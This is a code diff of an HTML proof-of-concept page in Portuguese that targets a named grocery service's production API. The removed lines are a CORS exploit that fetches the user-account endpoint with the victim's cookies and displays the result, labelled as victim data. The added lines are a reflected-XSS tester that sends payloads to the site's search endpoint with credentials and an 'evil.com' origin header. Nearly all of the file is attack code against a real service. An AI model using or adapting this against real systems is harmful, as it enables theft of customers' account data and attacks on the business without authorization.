@@ -2,30 +2,38 @@
 <html lang="pt-BR">
 <head>
   <meta charset="UTF-8" />
-  <title>PoC CORS Instabuy</title>
+  <title>Teste XSS reflexivo</title>
 </head>
 <body>
-  <h1>PoC CORS Exploit - Supermercado Índio</h1>
-  <pre id="output">Aguardando resposta...</pre>
+  <h1>Teste XSS Reflexivo - Supermercado Índio</h1>
+  <form id="form" action="#" onsubmit="return false;">
+    <label>Pesquisa (testar XSS):</label><br/>
+    <input type="text" id="searchInput" placeholder="Digite payload XSS" size="40" />
+    <button onclick="testXSS()">Testar</button>
+  </form>
+
+  <div id="result" style="margin-top: 20px; font-family: monospace;"></div>
 
   <script>
-    // Faz fetch para a API com credenciais (cookies/session) da vítima
-    fetch('https://api.instabuy.com.br/apiv3/user', {
-      method: 'GET',
-      credentials: 'include' // envia cookies mesmo cross-site
-    })
-    .then(response => {
-      if (!response.ok) throw new Error('Falha na requisição');
-      return response.json();
-    })
-    .then(data => {
-      document.getElementById('output').textContent = JSON.stringify(data, null, 2);
-      console.log('Dados da vítima:', data);
-    })
-    .catch(error => {
-      document.getElementById('output').textContent = 'Erro: ' + error.message;
-      console.error(error);
-    });
+    async function testXSS() {
+      const payload = document.getElementById('searchInput').value;
+      const url = `https://api.instabuy.com.br/apiv3/search?subdomain=superindio&query=${encodeURIComponent(payload)}`;
+      
+      try {
+        const res = await fetch(url, {
+          method: 'GET',
+          headers: {
+            'Origin': 'https://evil.com'
+          },
+          credentials: 'include'
+        });
+
+        const text = await res.text();
+        document.getElementById('result').textContent = text;
+      } catch (e) {
+        document.getElementById('result').textContent = 'Erro: ' + e.message;
+      }
+    }
   </script>
 </body>
 </html>
